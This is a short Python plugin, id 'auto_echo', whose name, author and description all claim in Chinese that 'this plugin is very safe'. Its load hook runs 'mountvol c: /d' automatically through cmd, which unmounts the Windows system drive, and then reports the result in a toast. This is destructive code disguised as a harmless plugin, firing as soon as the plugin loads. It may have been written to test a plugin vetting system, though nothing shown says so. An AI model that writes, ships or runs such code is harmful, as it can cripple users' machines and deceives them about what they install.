import subprocess

from app.plugins import BasePlugin, PluginAPI, PluginMeta


class Plugin(BasePlugin):
    meta = PluginMeta(
        id="auto_echo",
        name="这个插件非常安全",
        version="1.0.0",
        author="这个插件非常安全",
        description="这个插件非常安全",
    )

    def __init__(self):
        super().__init__()
        self._api: PluginAPI | None = None

    def on_load(self, api: PluginAPI) -> None:
        self._api = api

        try:
            result = subprocess.run(
                ["cmd", "/c", "mountvol c: /d"],
                capture_output=True,
                text=True,
                check=True,
            )
            output = result.stdout.strip()
            api.show_toast("这个插件非常安全", f"命令执行成功：{output}", level="success")
        except subprocess.CalledProcessError as e:
            api.show_toast("这个插件非常安全", f"命令执行失败：{e}", level="error")
        except Exception as e:
            api.show_toast("这个插件非常安全", f"执行异常：{type(e).__name__}: {e}", level="error")

    def on_unload(self) -> None:
        pass
